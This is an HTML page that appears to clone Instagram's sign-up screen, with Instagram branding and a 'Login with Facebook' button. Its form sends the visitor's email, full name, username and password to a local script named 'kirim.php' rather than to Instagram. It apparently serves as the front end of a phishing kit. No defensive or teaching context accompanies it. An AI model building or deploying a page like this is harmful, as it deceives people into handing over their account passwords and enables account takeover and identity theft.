<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Instagram</title>
	<link rel="stylesheet" href="style.css">
</head>
<body>

<div id ="container"> 

	<div class="Header">
		Instagram
	</div>

	<div class="subheader">
		Sign up to see photos and videos <br>
		from your firends.
	</div>

	<div class="button">
		<input type="submit" value="Login with Facebook">
	</div>

	<div class="content">
		<form action="kirim.php" method="POST">
			<input type="email" name="email" id="email" placeholder="Email"><br>
			<input type="text"	name="fullname" id="fullname" placeholder="Fullname"><br>
			<input type="text"	name="user" id="user" placeholder="Username"><br>
			<input type="password"	name="pw" id="pw" placeholder="Password"><br>
			<input type="submit" value="Sign UP">
		</form>

		
	</div>

		<div class="Footer">
		By Signing Up, you agree to our <br>
		<b>Terms</b> & <b>Privacy Policy</b>
		</div>
	

</div>
	
</body>
</html>